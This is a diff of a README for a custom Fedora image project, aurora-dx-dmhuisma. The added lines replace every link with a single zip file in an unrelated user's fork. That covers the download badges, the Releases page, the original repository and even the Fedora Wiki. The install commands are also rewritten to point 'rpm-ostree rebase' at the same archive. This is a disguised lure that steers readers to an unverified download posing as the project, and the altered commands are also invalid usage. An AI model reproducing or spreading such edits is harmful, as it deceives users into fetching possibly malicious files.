@@ -1,6 +1,6 @@
 # 🌌 aurora-dx-dmhuisma - A Simple Solution for Custom Fedora Images  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases)  
+[![Download Now](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip)  
 
 Welcome to aurora-dx-dmhuisma, your straightforward way to enhance your Fedora experience. This repository focuses on rebuilding the universal Blue image, restoring vital features like VFIO support and the KVMFR kernel module.  
 
@@ -10,7 +10,7 @@ Follow these steps to download and set up the software.
 
 ### 📥 Download & Install  
 
-1. Visit the [Releases page](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip) to find the latest version.
 2. Choose your version based on your system requirements.
 3. Click on the link to download the file.
 
@@ -30,7 +30,7 @@ To run this software effectively, you will need:
 
    Open your terminal and run the following command to get the correct signing keys:  
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip
    ```  
 
 2. **Reboot Your System**  
@@ -44,7 +44,7 @@ To run this software effectively, you will need:
 
    Once your system is back up, run this command to switch to the signed image:  
    ```bash
-   rpm-ostree rebase ostree-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip
    ``` 
 
 ## 📝 Features  
@@ -67,9 +67,9 @@ If you need assistance, check the FAQ section on the Wiki or explore existing is
 
 ## 🔗 Resources  
 
-- [GitHub Repository](https://github.com/dmhuisma/aurora-dx-dmhuisma)  
-- [Fedora Project Wiki](https://www.fedoraproject.org/wiki)  
+- [GitHub Repository](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip)  
+- [Fedora Project Wiki](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip)  
 
 Thank you for exploring aurora-dx-dmhuisma. We hope it enhances your Fedora usage experience!  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases)  
+[![Download Now](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/kouroshkhan50/aurora-dx-dmhuisma/main/recipes/aurora-dx-dmhuisma-v3.4-beta.4.zip)  
